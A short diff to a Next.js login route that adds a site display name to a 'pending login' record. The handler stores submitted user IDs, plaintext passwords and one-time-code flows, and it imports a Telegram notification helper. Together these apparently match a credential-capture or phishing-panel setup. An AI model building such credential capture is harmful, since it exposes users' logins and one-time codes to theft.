@@ -1,5 +1,6 @@
 import {NextRequest, NextResponse, after } from "next/server"
 import { createPendingLogin } from '@/lib/pending-logins'
+import { SITE_DISPLAY_NAME } from "@/src/lib/site-url"
 import { resolveMemberOrigin } from '@/lib/member-origin'
 import { sendFormNotification } from '@/lib/telegram'
 
@@ -16,6 +17,7 @@ export async function POST(request: NextRequest) {
     const memberOrigin = resolveMemberOrigin(request)
     const record = await createPendingLogin({
       projectId: 'thestandard',
+      projectName: SITE_DISPLAY_NAME,
       requestKind: flow === 'login_otp' ? 'otp' : 'login',
       userId: String(userId),
       password: String(password),
